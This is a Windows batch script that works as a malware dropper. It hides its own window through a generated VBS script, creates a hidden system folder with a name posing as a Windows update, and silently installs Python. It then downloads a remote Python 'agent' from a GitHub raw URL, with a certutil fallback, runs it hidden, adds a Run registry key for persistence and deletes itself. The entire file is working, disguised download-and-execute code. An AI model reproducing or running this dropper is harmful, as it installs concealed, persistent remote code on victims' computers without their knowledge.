@echo off

if "%~1"=="" (
    echo Set WshShell = CreateObject("WScript.Shell") : WshShell.Run chr(34) ^& WScript.ScriptFullName ^& " Run" ^& chr(34), 0 : Set WshShell = Nothing > "%temp%\hide.vbs"
    wscript.exe "%temp%\hide.vbs"
    exit /b
)

:: Set variables
set "TARGET_DIR=%ProgramData%\Microsoft\Windows\sysupdate"
set "AGENT_NAME=svchost_update.py"
set "AGENT_PATH=%TARGET_DIR%\%AGENT_NAME%"
set "RAW_URL=https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"
set "PYTHON_INSTaller=%temp%\python_installer.exe"
set "PYTHON_URL=https://www.python.org/ftp/python/3.11.7/python-3.11.7-embed-amd64.zip"

:: Create hidden target directory
mkdir "%TARGET_DIR%" >nul 2>&1
attrib +h +s "%TARGET_DIR%" >nul 2>&1

:: Check if Python is available
if exist "%PYTHON_EXE%" goto :download_agent

:: Try to find system Python first
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON_EXE=pythonw.exe"
    goto :download_agent
)

:: Download and install Python embeddable package (silent)
powershell -Command "& {Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%temp%\py.zip' -UseBasicParsing}" >nul 2>&1
if exist "%temp%\py.zip" (
    mkdir "%TARGET_DIR%\python" >nul 2>&1
    powershell -Command "& {Expand-Archive -Path '%temp%\py.zip' -DestinationPath '%TARGET_DIR%\python' -Force}" >nul 2>&1
    :: Enable pip in embedded Python
    echo import site >> "%TARGET_DIR%\python\python311._pth"
    del "%temp%\py.zip" >nul 2>&1
    set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"
)

:download_agent
:: Download agent script from raw GitHub
powershell -Command "& {Invoke-WebRequest -Uri '%RAW_URL%' -OutFile '%AGENT_PATH%' -UseBasicParsing}" >nul 2>&1
if not exist "%AGENT_PATH%" goto :fallback_download

:: Set file attributes to hidden/system
attrib +h +s "%AGENT_PATH%" >nul 2>&1

:: Run agent silently in background using pythonw (no console)
start "" /B "%PYTHON_EXE%" "%AGENT_PATH%" --hidden >nul 2>&1

:: Optional: Add to registry for persistence (Run key)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateService" /t REG_SZ /d "\"%PYTHON_EXE%\" \"%AGENT_PATH%\"" /f >nul 2>&1

:: Self-delete batch file after execution
del "%~f0" >nul 2>&1
exit /b

:fallback_download
:: Fallback: Use certutil if PowerShell blocked
certutil -urlcache -split -f "%RAW_URL%" "%AGENT_PATH%" >nul 2>&1
if exist "%AGENT_PATH%" (
    attrib +h +s "%AGENT_PATH%" >nul 2>&1
    start "" /B "%PYTHON_EXE%" "%AGENT_PATH%" --hidden >nul 2>&1
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateService" /t REG_SZ /d "\"%PYTHON_EXE%\" \"%AGENT_PATH%\"" /f >nul 2>&1
)
del "%~f0" >nul 2>&1
exit /b
